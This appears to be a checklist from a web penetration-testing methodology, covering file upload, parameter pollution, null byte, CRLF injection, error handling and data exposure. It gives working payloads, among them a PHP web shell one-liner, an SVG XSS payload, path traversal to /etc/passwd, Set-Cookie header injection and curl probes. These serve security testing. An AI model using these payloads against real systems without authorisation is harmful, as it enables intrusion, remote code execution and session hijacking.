# Batch 06 — Upload, HPP, null byte, CRLF, errors, data leak

## FILL IN

```bash
T="https://TARGET"
```

## GOAL
Finish **6 checks**: File Upload, HPP, Null Byte Injection, CRLF Injection, Improper Error Handling, Excessive Data Exposure.

## TIME
1–2 hours

## YOU NEED
- Upload feature if any  
- Batch 00 history for multi-param requests  
- OAST optional  

---

## WHY (30 seconds)

**Upload** = get evil file to execute or be served (XSS/shell).  
**HPP** = duplicate params; front and back parse differently.  
**Null byte** = old “end string early” (`file.pdf%00.php`).  
**CRLF** = inject headers/body split (`%0d%0a`).  
**Error handling** = stack traces = paths, versions, SQL.  
**Excessive data** = API returns too many fields (password hashes, internal ids).

---

## DO THIS

### A) File Upload

1. Upload normal image → note Content-Type, extension, path returned.  
2. Try:

```text
shell.php, shell.jsp, shell.aspx, shell.html, shell.svg
image.php.jpg  image.jpg.php
Content-Type: image/jpeg  but body = PHP
GIF89a; <?php system($_GET['c']); ?>
```

3. SVG XSS:

```xml
<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

4. Path overwrite names: `../config.json`, long names, double extensions.  
5. After upload, request the **URL** returned — does it execute or serve as static?

**Win:** execute code, stored XSS, or overwrite sensitive path.

### B) HTTP Parameter Pollution (HPP)

On any multi-value interest:

```http
GET /api?user=attacker&user=victim
GET /api?user=victim&user=attacker
POST ...  user=a&user=b
```

Also:

```text
?id=1&id=2
?id[]=1&id[]=2
```

**Win:** authz/filter uses first value, app logic uses second (or reverse).

### C) Null Byte Injection

Where extension or path is checked:

```text
shell.php%00.jpg
../../etc/passwd%00
file.pdf%00.html
```

Modern stacks often ignore — still try on older Java/PHP vibes.

### D) CRLF Injection

Headers you control that may be reflected into response headers / logs:

```text
User-Agent: x%0d%0aInjected-Header: 1
redirect=https://x%0d%0aSet-Cookie:%20session=owned
```

```bash
curl -skI "https://TARGET/logout?next=https://x%0d%0aSet-Cookie:%20a=b"
```

**Win:** response shows injected header / split response (header injection).

### E) Improper Error Handling

Trigger errors:

```text
'  "  \  %s  verylongstring  wrong type JSON  DELETE method
```

```bash
curl -sk "https://TARGET/api/item/not-a-uuid"
curl -sk -X POST "https://TARGET/api" -H "Content-Type: application/json" -d '{'
```

**Win:** stack trace, SQL, internal host, full path.

### F) Excessive Data Exposure

1. Call list/detail APIs as normal user.  
2. Compare UI fields vs JSON keys.  
3. Look for:

```text
password passwordHash ssn internalId role isAdmin cost secret apiKey
```

```bash
curl -sk "https://TARGET/api/users/me" -H "Cookie: ..." | jq .
```

**Win:** sensitive fields in JSON never shown in UI (or other users’ fields in list).

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| Upload stored XSS | Pair with batch 01 |
| HPP changes authz | Pair with batch 04 |
| Fat API JSON | High if secrets |

---

## NEXT
→ [07-smuggling-desync.md](./07-smuggling-desync.md)
